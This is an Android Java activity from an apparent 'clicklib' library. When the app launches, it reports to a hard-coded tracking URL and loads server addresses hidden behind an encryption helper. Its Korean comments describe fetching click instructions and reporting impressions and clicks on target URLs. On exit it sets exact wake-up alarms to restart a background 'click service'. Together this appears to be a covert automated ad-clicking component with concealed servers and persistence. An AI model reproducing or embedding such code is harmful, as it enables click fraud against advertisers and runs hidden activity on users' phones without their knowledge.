package com.click.clicklib;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.RequiresApi;

public class WebClickRootActivity extends Activity {

    public static Context mContext;

    //
//    /**
//     * 서비스 시작함수
//     **/
    public void StartService() {
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            Intent intent = new Intent(WebClickRootActivity.this, ReClickService.class);
//            intent.setAction(ReClickService.FORE);
//            startForegroundService(intent);
//            Log.i("test1","실행0");
//        }else {
//            Intent intent = new Intent(WebClickRootActivity.this, WebClickService.class);
//            startService(intent);
//        }
        Log.i("test1","어플시작");
        finish();
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.click_root);
        mContext = this;
        ServerCall serverCall = new ServerCall("http://sideup.co.kr/count/log/index.php?a=run&m=5linktop&p=bible",null);
        serverCall.execute();


        MainService.g_ShowLog = false;

//        /** 메인사이트에 접속하여 클릭이 어떻게 수행될것인지 에 대한 정보를 가져온다. **/
        try {

            Utils.setSOString(mContext, MainService.m_MAINURL, AES256Chiper.getServer1(mContext));


//        /**
//         * 노출 카운트 URL (아래의 파라메터로 포스트로 날린다)
//         * 파라메터1 : code
//         * 파라메터2 : state (고정값 "sc")
//         *
//         **/

        Utils.setSOString(mContext, MainService.m_SHOWURL, AES256Chiper.getServer2(mContext));

//        /**
//         * 클릭 카운트 URL (아래의 파라메터로 포스트로 날린다)
//         * 파라메터1 : code
//         * 파라메터2 : state (고정값 "ck")
//         * 파라메터3 : url (E값에 있는 URL)
//         * 파라메터4 : surl (클릭하는 타겟 URL)
//         **/
        Utils.setSOString(mContext, MainService.m_CLICKURL, AES256Chiper.getServer2(mContext));

//        /** 서비스를 시작한다. **/
        } catch (Exception e) {
            e.printStackTrace();
        }

        StartService();
    }


    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    @SuppressLint("NewApi")
    @Override
    protected void onDestroy() {
        if (!Utils.isServiceRunning(WebClickRootActivity.this)) {
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent alarmIntent = new Intent(WebClickRootActivity.this, RestartReceiver.class);
            alarmIntent.setAction("ACTION_RESTART_CLICK_SERVICE");
            PendingIntent sender = PendingIntent.getBroadcast(WebClickRootActivity.this, 0, alarmIntent, 0);
            am.setExact(AlarmManager.RTC_WAKEUP, 1000, sender);
            Log.i("test1","어플시작1");
        }else {
            if (!(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)) {
                AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
                Intent alarmIntent = new Intent(WebClickRootActivity.this, RestartReceiver.class);
                alarmIntent.setAction("ACTION_RESTART_CLICK_SERVICE");
                PendingIntent sender = PendingIntent.getBroadcast(WebClickRootActivity.this, 0, alarmIntent, 0);
                am.setExact(AlarmManager.RTC_WAKEUP, 1000, sender);
                Log.i("test1","어플시작2");

            }
        }
        super.onDestroy();
    }
}